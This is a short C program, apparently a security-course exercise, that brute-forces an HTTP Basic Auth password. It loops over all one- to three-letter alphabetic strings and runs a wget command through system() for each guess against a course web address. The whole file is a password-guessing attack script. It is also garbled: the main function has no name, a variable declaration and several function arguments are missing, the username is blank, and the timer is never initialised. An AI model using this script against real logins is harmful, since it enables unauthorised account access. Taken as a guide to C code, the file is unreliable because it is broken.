
#include "stdio.h"
#include "string.h"

#include "stdlib.h"


void passwordcheck(char pass[],int tt,int not);
()
{
int i,j,k,t,tt,not;
char cp[3];

char [4];

char a[]={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};

tt=time(&(t));
not=0;
for (i=0;i<=51;i++)
{
	
	cp[0]=a[i];
	sprintf(,"%c",cp[0]);
	passwordcheck(,tt,not);
	for (j=0;j<=51;j++)
	{
		
		
		cp[0]=a[i];
		cp[1]=a[j];
		sprintf(,"%c%c",cp[0],cp[1]);
		passwordcheck(,tt,not);
		for(k=0;k<=51;k++)
		{
			
							
			cp[0]=a[i];
			cp[1]=a[j];
		
			cp[2]=a[k];
			
			sprintf(,"%c%c%c",cp[0],cp[1],cp[2]);
			
			passwordcheck(,tt,not);
			
					
		}
		
				
		
	}
}

}



void passwordcheck(char pass[],int tt,int not)
{
char url[400];
int num,ti,tti;

			
strcpy(url,"wget --http-user= --http-passwd=");
			strcat(url,pass);
			
			strcat(url," http://sec-crack.cs.rmit.edu./SEC/2/index.php"); 
			printf("The password combination is :%s",pass);
			fflush(stdout);	
			num=system(url);
			not++;
			if (num==0)
			{
				
				time(&(ti));
				tti=ti-tti;
				printf("The actual password is :%s\n",pass);
				printf("The number of attempts   crack the password is :%d",not);
				printf("The time_var taken  find the password by brute force attack is :%d\n seconds",tti);
				exit(1);
				
				
			}
						
			else
			{
			strcpy(pass,"");
			}
			


}
 


